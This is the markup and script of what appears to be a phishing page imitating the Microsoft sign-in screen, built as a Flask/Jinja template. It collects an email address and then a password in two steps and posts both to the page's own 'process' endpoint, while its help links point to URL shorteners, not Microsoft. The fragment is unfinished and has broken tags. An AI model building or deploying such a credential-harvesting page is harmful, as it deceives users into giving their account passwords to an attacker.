  <div class="container" id="loginContainer">
    <div class="miclogo"><img src="images/microsoft_logo.png" alt="img"><p>Microsoft</p>

    <div class="sign"><p>Sign in</p></div>
    
    <form action="{{ url_for('process') }}" method="post" id="formbd">
      <div class="form-group">
        <input type="email" id="username" name="username" placeholder="Email, phone, or Skype" required>

      <div class="no_acc"><p>No account?</p><p class="p2">Create <a href="https://t.ly/khCBW"></a> one!</a></p></div>
      <div class="access_acc"><p>Can't access your account?<a href="https://t.ly/oHda2"></a></p></div>
      <div class="form-group2">
        <button class="back" type="submit">Back</button>
        <button class="next" type="submit" onclick=nextPage()>Next</button>
      </div>
    </form>
    <div class="login-downcontainer"> 
        <img class="key" src="/static/images/key.png" alt="">
        <p class="option">Sign-in options</p>
    </div>
  </div>
  

  <script>
    function nextPage() {
      var container = document.getElementById('loginContainer');
      var usernameInput = document.getElementById('username');
    
  
      if (usernameInput.value.trim() !== "") {
        container.innerHTML = `
        <div class="miclogo"><img src="images/microsoft_logo.png" alt=""><p>Microsoft</p></div>
        <div class="username-display" onclick="prevPage()"> ‚Üê ${usernameInput.value}</div>
        <div class="sign"><p>Enter Password</p></div>
        <form action="{{ url_for('process') }}" method="post">
        <input type="hidden" id="username" name="username" value="${usernameInput.value}">
          <div class="form-group">
            <input type="text" id="password" name="password" placeholder="Password" required>
          </div>
          <div class="access_acc"><p>Forgot my password<a href="https://t.ly/oHda2"></a></p></div>
        
          <div class="form-group2">
               <input type="button" class="sign_in" value="sign in" onclick='submitForm()'>
          </div>
        </form>
        `;
        container.classList.add('password');


      }
    }
  
    function prevPage() {
      var container = document.getElementById('loginContainer');
      container.innerHTML = `
      <div class="miclogo"><img src="/static/images/microsoft_logo.png" alt=""><p>Microsoft</p>
      </div>
      <div class="sign"><p>Sign in</p></div>
      
      <form>

          <input type="text" id="username" name="username" placeholder="Email, phone, or Skype" required>

        <div class="no_acc"><p>No account?</p><p class="p2">Create <a href="https://t.ly/khCBW"></a> one!</a></p></div>
        <div class="access_acc"><p>Can't access your account?<a href="https://t.ly/oHda2"></a></p></div>
        <div class="form-group2">
          <button class="back" type="submit">Back</button>
          <button class="next" type="submit" onclick="nextPage()">Next</button>
        <div class="login-downcontainer"> 
            <img class="key" src="/images/key.png" alt="">
            <p class="option">Sign-in options</p>
        </div>
      `;
      container.classList.remove('password');
    }
